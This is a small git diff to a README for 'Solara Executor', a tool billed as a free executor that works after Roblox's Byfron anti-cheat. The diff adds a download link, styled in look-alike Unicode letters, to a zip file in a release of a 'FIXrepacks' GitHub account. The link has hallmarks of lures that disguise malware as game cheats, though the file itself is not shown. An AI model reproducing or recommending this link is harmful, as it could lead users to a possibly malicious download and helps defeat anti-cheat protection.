@@ -4,6 +4,7 @@
 
 **The First free ; Best External Executor After Byfron.**
 
+# 📁[𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/FIXrepacks/SolaraExecutor/releases/download/SolaraRealese/Solara.zip)
 
 ![image](https://github.com/user-attachments/assets/4873d4e0-5a4a-457b-b9fe-2f6bead924a4)
 
